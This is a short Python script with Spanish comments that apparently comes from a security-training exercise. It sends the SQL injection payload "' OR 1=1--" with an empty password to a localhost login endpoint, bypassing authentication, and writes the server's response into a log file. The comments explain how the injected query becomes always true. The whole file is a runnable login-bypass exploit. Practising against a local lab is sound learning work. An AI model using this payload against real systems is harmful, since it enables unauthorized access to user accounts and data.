#Importo el módulo sys para direccionar el log al momento de correr mi Script en el archivo access.log.2024-12-14, ubicado dentro de logs/
import sys
sys.stdout = open('../logs/access.log.2024-12-14', 'w')

#Importo el módulo "requests" para la realización de solicitudes HTTP
import requests

#Direccionamiento de URL
url = "http://localhost:3000/rest/user/login"

#Creación del "payload" para la inyección SQL, se valida en el login que solo hace referencia a Email y Password
#La consulta SQL será # SELECT * FROM users WHERE email = '' OR 1=1--' AND password = '';
# El -- hace que el resto de la consulta lo comente
#La consulta SQL resultante será # SELECT * FROM users WHERE email = '' OR 1=1;
#La condición 1=1 es siempre verdadera
payload = {"email": "' OR 1=1--", "password": ""}
response = requests.post(url, json=payload)

# Se manda a imprimir la variable "response" para ver contenido
print(response.text)
